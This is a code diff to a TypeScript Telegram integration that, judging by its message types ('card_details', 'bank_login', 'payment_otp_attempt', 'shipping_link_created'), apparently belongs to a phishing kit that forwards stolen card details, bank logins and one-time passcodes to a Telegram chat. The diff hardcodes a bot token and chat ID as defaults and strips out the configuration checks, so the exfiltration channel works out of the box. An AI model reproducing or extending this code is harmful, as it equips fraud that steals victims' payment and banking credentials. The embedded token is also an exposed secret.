@@ -1,20 +1,9 @@
 // Telegram Bot Integration
-// IMPORTANT: Set these environment variables in your .env file
-const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
-const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '';
-
-// IMPORTANT: CHAT_ID must be a USER chat ID, NOT the bot ID
-// To get your chat ID:
-// 1. Start conversation with your bot
-// 2. Send any message to the bot
-// 3. Visit: https://api.telegram.org/bot<BOT_TOKEN>/getUpdates
-// 4. Look for "chat":{"id": in the response - that's your chat ID
-// 5. Or use the helper tool: open get-user-chat-id.html in your browser
-
-// Check if credentials are properly configured
-if (!BOT_TOKEN || !CHAT_ID) {
-  console.warn('⚠️ Telegram credentials not configured. Please set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in your .env file.');
-}
+// These values are set for automatic deployment. 
+// For production, you can override them using environment variables:
+// VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID
+const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';
+const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-1003209802920';
 
 export interface TelegramMessage {
   type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'payment_otp_attempt' | 'test';
@@ -32,15 +21,7 @@ export interface TelegramResponse {
 
 export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
   try {
-    // Check if credentials are properly configured
-    if (!BOT_TOKEN || !CHAT_ID) {
-      const errorMsg = 'Telegram credentials not configured. Please set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in your .env file.';
-      console.error('❌', errorMsg);
-      return {
-        success: false,
-        error: errorMsg
-      };
-    }
+    // Telegram is configured and ready
 
     const text = formatTelegramMessage(message);
 
